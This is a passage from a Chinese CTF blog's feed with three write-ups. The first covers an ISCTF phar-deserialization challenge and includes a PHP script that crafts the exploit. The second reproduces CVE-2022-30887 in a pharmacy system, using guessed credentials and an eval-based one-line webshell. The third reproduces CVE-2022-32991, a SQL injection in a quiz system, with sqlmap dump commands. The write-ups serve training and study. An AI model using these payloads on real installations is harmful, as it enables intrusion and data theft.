class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试上传文件发现除了jpg图片，别的都不让上传。</p><p>分析源码发现存在文件包含。</p><p>上传一个带有一句话木马的jpg图片，再利用文件包含。</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="https://img-blog.csdnimg.cn/3ee5d0e90bd04e888b959499496edf50.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Gn1Jbzjj-1667889751766)(/Users/sun/Library/Application Support/typora-user-images/image-20221108143649804.png)]"></p><p>源码index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$down</span> = <span class="keyword">new</span> <span class="title function_ invoke__">check_img</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;<span class="title function_ invoke__">img_check</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">         <span class="variable">$up</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line">         <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码发现存在file_exit()函数并且可以上传文件，想到phar反序列化。</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$phartest</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phartest.phar&#x27;</span>,<span class="number">0</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phartest</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ISCTF补充&quot;&gt;&lt;a href=&quot;#ISCTF补充&quot; class=&quot;headerlink&quot; title=&quot;ISCTF补充&quot;&gt;&lt;/a&gt;ISCTF补充&lt;/h1&gt;&lt;h2 id=&quot;easy-upload&quot;&gt;&lt;a href=&quot;#easy-upload&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>春秋云镜 CVE-2022-30887 多语言药房管理系统 (MPMS)</title>
    <link href="https://ctfsun.github.io/2022/11/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20CVE-2022-30887%20%E5%A4%9A%E8%AF%AD%E8%A8%80%E8%8D%AF%E6%88%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20(MPMS)%20/"/>
    <id>https://ctfsun.github.io/2022/11/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20CVE-2022-30887%20%E5%A4%9A%E8%AF%AD%E8%A8%80%E8%8D%AF%E6%88%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20(MPMS)%20/</id>
    <published>2022-11-01T17:28:00.000Z</published>
    <updated>2022-11-10T12:55:59.109Z</updated>
    
    <content type="html"><![CDATA[<p><code>提示：以下是本篇文章正文内容，下面案例可供参考</code></p><h1 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h1><p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p><h1 id="二、简单分析"><a href="#二、简单分析" class="headerlink" title="二、简单分析"></a>二、简单分析</h1><p>进入靶场后我们首先可以看到一个登录界面。<br><img src="https://img-blog.csdnimg.cn/3f0768cc2b9045b4a7029244f2726003.png" alt="在这里插入图片描述"><br>在尝试弱口令和Forgot Password没用后，开始寻找别的有用的信息。最后在页面底部发现了有用的信息，此网站的作者是Mayuri K。<br><img src="https://img-blog.csdnimg.cn/f60756c1059840ab85658167c6ae5bc3.png" alt="在这里插入图片描述"><br>点击作者即可跳转到作者的主页，在这里发现了源代码。</p><p><img src="https://img-blog.csdnimg.cn/784044fae03a4f90868ede437daf7564.png" alt="在这里插入图片描述"><br>源代码链接：</p><blockquote><p><a href="https://www.mayurik.com/source-code/P0349/best-pharmacy-billing-software-free-download">https://www.mayurik.com/source-code/P0349/best-pharmacy-billing-software-free-download</a></p></blockquote><p>并且我也在国家信息安全漏洞库里找到了这个漏洞<br><img src="https://img-blog.csdnimg.cn/4234ab2c83214dfeae8e5e837776708c.png" alt="在这里插入图片描述"></p><p>漏洞简介</p><blockquote><p>Pharmacy Management System（MPMS）是Mayuri K.个人开发者的一个多语言药房管理系统。Pharmacy Management System v1.0 版本存在安全漏洞，该漏洞源于组件 &#x2F;php_action&#x2F;editProductImage.php 包含远程代码执行（RCE）问题。攻击者利用该漏洞可以通过制作的图像文件执行任意代码。</p></blockquote><p>不过我们想上传文件得进入后台，进入后台得找到用户名和密码。联系到此网站的作者是Mayuri K，我们可以尝试用作者的email和name作为用户名和密码。</p><blockquote><p>email：<a href="mailto:&#109;&#x61;&#x79;&#117;&#114;&#x69;&#46;&#105;&#110;&#x66;&#x6f;&#115;&#x70;&#97;&#99;&#x65;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;">&#109;&#x61;&#x79;&#117;&#114;&#x69;&#46;&#105;&#110;&#x66;&#x6f;&#115;&#x70;&#97;&#99;&#x65;&#64;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;</a><br>passwd：mayurik</p></blockquote><p><img src="https://img-blog.csdnimg.cn/484dec3d6f644c419a6abcc169b30495.png" alt="在这里插入图片描述"><br>发现登录成功，进入后台可以发现这里可以上传文件<br><img src="https://img-blog.csdnimg.cn/421e7f4d6ae74847a91886a9eed4f833.png" alt="在这里插入图片描述"><br>提前构造好一句话木马shell.php</p><p><code>&lt;?php eval($_POST[cmd]):?&gt;</code></p><p>上传一句话木马，其余信息随便填一下。<br><img src="https://img-blog.csdnimg.cn/31f22df2734d4f5b97a191292df7fcc9.png" alt="在这里插入图片描述"><br>上传成功<br><img src="https://img-blog.csdnimg.cn/cf612a0dfb31491ca8debba8866d01e0.png" alt="在这里插入图片描述"><br>右键图片复制图片地址</p><blockquote><p><a href="http://xxxxx/assets/myimages/shell.php">http://xxxxx/assets/myimages/shell.php</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/2b3c68aa83564200a5e613de2b3a3f06.png" alt="在这里插入图片描述"><br>访问图片地址，执行payload<br><code>cmd=system(&#39;tac /f*&#39;);</code><br><img src="https://img-blog.csdnimg.cn/a0e4f201fd784269a15272046a3f411f.png" alt="在这里插入图片描述"></p><h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>本道题虽然简单，但是运用到的知识点不少，信息搜集，社工，文件上传，命令执行，代码执行都有体现，比较适合新手入门。</p><blockquote><p>复现CVE比打CTF容易多了，打了几天的Hackergame打的头疼，复现几个CVE放松放松。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;提示：以下是本篇文章正文内容，下面案例可供参考&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;一、题目描述&quot;&gt;&lt;a href=&quot;#一、题目描述&quot; class=&quot;headerlink&quot; title=&quot;一、题目描述&quot;&gt;&lt;/a&gt;一、题目描述&lt;/h1&gt;&lt;p&gt;多语言药房管理系统 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>春秋云镜 CVE-2022-32991 Web Based Quiz System v1.0</title>
    <link href="https://ctfsun.github.io/2022/11/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20CVE-2022-32991%20Web%20Based%20Quiz%20System%20v1.0/"/>
    <id>https://ctfsun.github.io/2022/11/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20CVE-2022-32991%20Web%20Based%20Quiz%20System%20v1.0/</id>
    <published>2022-10-31T17:28:00.000Z</published>
    <updated>2022-11-10T12:56:10.917Z</updated>
    
    <content type="html"><![CDATA[<p><code>提示：以下是本篇文章正文内容，下面案例可供参考</code></p><h1 id="一、-靶场介绍"><a href="#一、-靶场介绍" class="headerlink" title="一、 靶场介绍"></a>一、 靶场介绍</h1><p>该CMS的welcome.php中存在SQL注入攻击。</p><p>Web Based Quiz System v1.0 通过welcome.php 中的eid 参数被发现包含一个SQL 注入漏洞。</p><h1 id="二、-简单分析"><a href="#二、-简单分析" class="headerlink" title="二、 简单分析"></a>二、 简单分析</h1><p>先进入靶场，可以看到LOGIN和REGISTER，我们先注册一个账号，点击LOGIN进入CMS。<br><img src="https://img-blog.csdnimg.cn/b34b83bfd754481096ed87246116bab2.png" alt="在这里插入图片描述"><br>进入之后我们观察url，发现我们此时就在welcome.php，并且url后面跟着一个参数q</p><p><img src="https://img-blog.csdnimg.cn/8386fb0df9b143ebbf9129880ee9abfa.png" alt="在这里插入图片描述"><br>审计源代码可以发现welcome.php中的参数没有进行过滤，而且eid参数可控，此处存在SQL注入<br><img src="https://img-blog.csdnimg.cn/ee3c962c1fad4a7d8d9ef3756ae6547a.png" alt="在这里插入图片描述"></p><p>到这里思路基本清晰，答案也呼之欲出。直接用sqlmap一把梭。<br><em><strong>源代码下载地址</strong></em></p><blockquote><p><a href="https://www.123pan.com/s/WAYKVv-6y8wh">https://www.123pan.com/s/WAYKVv-6y8wh</a><br>提取码:t2Oc</p></blockquote><p>先随便点击一个start<br><img src="https://img-blog.csdnimg.cn/25c42f0344dc4d4e872703f388fbc1e8.png" alt="在这里插入图片描述"></p><p>先用Burp Suite抓包<br><img src="https://img-blog.csdnimg.cn/34ceb68c0c4143eab11912abc78c1c1d.png" alt="在这里插入图片描述"></p><p>然后右键，选择Copy to fIle，保存为sql.txt<br><img src="https://img-blog.csdnimg.cn/43f8074e46f94551852935c4e4b54e00.png" alt="在这里插入图片描述"><br>在终端输入以下命令：</p><p>获取数据库名<br><code>sqlmap -r 1.txt --dbs  --random-agent -p eid </code></p><p>获取表名<br><code>sqlmap -r 1.txt -D ctf --tables  --random-agent -p eid</code></p><p>获取列名<br><code>sqlmap -r 1.txt -D ctf -T flag --columns  --random-agent -p eid</code></p><p>获取flag<br><code>sqlmap -r 1.txt -D ctf -T flag -C flag --dump  --random-agent -p eid</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;提示：以下是本篇文章正文内容，下面案例可供参考&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;一、-靶场介绍&quot;&gt;&lt;a href=&quot;#一、-靶场介绍&quot; class=&quot;headerlink&quot; title=&quot;一、 靶场介绍&quot;&gt;&lt;/a&gt;一、 靶场介绍&lt;/h1&gt;&lt;p&gt;该CMS的w</summary>
      
    
    
    
    
  </entry>
  
</feed>
